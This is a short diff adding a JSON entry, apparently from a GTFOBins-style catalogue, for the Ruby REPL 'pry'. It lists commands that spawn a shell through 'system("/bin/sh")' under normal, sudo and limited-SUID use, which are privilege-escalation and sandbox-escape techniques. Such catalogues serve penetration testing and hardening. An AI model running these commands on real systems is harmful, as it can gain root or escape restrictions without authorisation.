@@ -1,0 +1,19 @@
+{
+  "functions": {
+    "shell": [
+      {
+        "code": "pry\nsystem(\"/bin/sh\")\n"
+      }
+    ],
+    "sudo": [
+      {
+        "code": "sudo pry\nsystem(\"/bin/sh\")\n"
+      }
+    ],
+    "limited-suid": [
+      {
+        "code": "./pry\nsystem(\"/bin/sh\")\n"
+      }
+    ]
+  }
+}
